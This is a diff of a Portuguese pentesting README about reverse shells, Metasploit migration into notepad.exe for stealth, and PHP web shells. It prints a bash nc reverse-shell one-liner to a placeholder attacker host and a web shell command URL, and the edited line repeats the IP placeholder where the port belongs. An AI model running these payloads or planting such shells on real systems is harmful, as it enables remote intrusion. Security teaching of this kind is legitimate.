@@ -2,42 +2,15 @@
 
 <div align="center">
 <img src="foto.jpg" width="450" height="650">
-</div>
-
-## Sumário
-
-- [Introdução](#introdu%C3%A7%C3%A3o)
-    
-- [O que é um Reverse Shell?](#o-que-%C3%A9-um-reverse-shell)
-    
-- [Como configurar um Reverse Shell](#como-configurar-um-reverse-shell)
-    
-    - [Listener (Atacante)](#1-listener-atacante)
-        
-    - [Payload (Máquina Vítima)](#2-payload-m%C3%A1quina-v%C3%ADtima)
-        
-    - [Conexão recebida (Atacante)](#3-conex%C3%A3o-recebida-atacante)
-        
-- [Ferramentas e Geradores de Reverse Shell](#ferramentas-e-geradores-de-reverse-shell)
-    
-- [Web Shells](#web-shells)
-    
-    - [Exemplo Simples de PHP Web Shell](#exemplo-simples-de-php-web-shell)
-        
-    - [Ferramentas Comuns e Exemplos](#ferramentas-comuns-e-exemplos)
-        
-- [Referências Confiáveis](#refer%C3%AAncias-confi%C3%A1veis)
-    
-- [Disclaimer](#disclaimer)
-    
+</div>  
 
 ---
 
 ## Introdução
 
-Este artigo aborda o uso de **Reverse Shells** e **Web Shells** em um contexto de **testes de segurança ofensiva** (também conhecidos como _Pentests_). Esses conceitos são essenciais para analistas e pesquisadores de segurança que desejam compreender e testar a exposição de sistemas a ataques remotos.
+Este artigo aborda o uso de **Reverse Shells** e **Web Shells** em um contexto de **testes de segurança ofensiva**. Esses conceitos são essenciais para analistas e pesquisadores de segurança que desejam compreender e testar a exposição de sistemas a ataques remotos.
 
-A imagem que ilustra este README é apenas uma brincadeira sobre como um simples processo (`notepad.exe`) pode se tornar “demoníaco” quando inicia uma conexão reversa para a máquina de um atacante, abrindo caminho para exploração do sistema.
+A imagem que ilustra este README é apenas uma brincadeira sobre como um simples processo (`notepad.exe`) pode se tornar sinistro quando inicia uma conexão reversa para a máquina de um atacante, abrindo caminho para exploração do sistema.
 
 ---
 
@@ -68,23 +41,23 @@ No seu **host de ataque**, abra um **listener** (ouvinte) que aguardará a conex
 
 No alvo, executamos o **payload** que iniciará a conexão reversa para o IP do atacante e porta configurada. Exemplos de payload em **Bash**:
 
-`rm -f /tmp/f mkfifo /tmp/f cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f`
+`rm -f /tmp/f mkfifo /tmp/f cat /tmp/f | sh -i 2>&1 | nc IP_ATACANTE IP_ATACANTE >/tmp/f`
 
-> Substitua `ATTACKER_IP` e `ATTACKER_PORT` pelos valores adequados, por exemplo `10.10.13.37` e `443`.
+> Substitua `IP_ATACANTE` e `IP_ATACANTE` pelos valores adequados, por exemplo `172.16.52.5` e `443`.
 
 ### 3. Conexão recebida (Atacante)
 
 Se tudo ocorrer bem, você verá algo como:
 
-`connect to [10.4.99.209] from (UNKNOWN) [10.10.13.37] 59964`
+`connect to [172.16.26.6] from (UNKNOWN) [172.16.52.5] 59964`
 
 E terá um shell interativo na máquina alvo.
 
 ---
 
-## Metasploit e a Migração para Notepad.exe: A Arte do Disfarce
+## Metasploit e a Migração para Notepad.exe
 
-Em cenários onde a persistência e a invisibilidade são cruciais, o **Metasploit** se destaca com sua capacidade de realizar operações avançadas — uma delas é a **migração de processos**. Inspirados na imagem que brinca com a ideia do `notepad.exe` assumindo uma nova função, podemos usar essa técnica para “disfarçar” um payload.
+Em cenários onde a persistência e a invisibilidade são cruciais, o **Metasploit** se destaca com sua capacidade de realizar operações avançadas, uma delas é a **migração de processos**. Inspirados na imagem que brinca com a ideia do `notepad.exe` assumindo uma nova função, podemos usar essa técnica para “disfarçar” um payload.
 
 ### Por que Migrar processo?
 
@@ -105,7 +78,7 @@ Após obter acesso com uma sessão do Metasploit, o comando para migrar para o `
 
 Essa técnica transforma o que inicialmente poderia ser uma conexão de shell “aberta” em uma operação mais furtiva, onde o payload passa a ser executado dentro de um processo bem conhecido e muitas vezes desconsiderado pelos mecanismos automáticos de segurança.
 
-A integração deste comando no fluxo do ataque não só aprimora a ocultação do invasor, mas também ilustra a versatilidade do Metasploit em adaptar ataques a cenários reais — assim como a imagem sugere, onde o inofensivo se transforma no inesperado.
+Nem sempre o notepad será a melhor opção, mas usamos ele de exemplo só pra mostrar que é possivel, é bom deixar claro também que existem outros processos mais importantes e mais uteis para se camuflar.
 
 ---
 
@@ -136,7 +109,7 @@ Um exemplo clássico seria algo como:
 
 Para acessar o shell, basta navegar até:
 
-`http://target.com/shell.php?cmd=whoami`
+`http://www.alvo.com/shell.php?cmd=whoami`
 
 ---
 
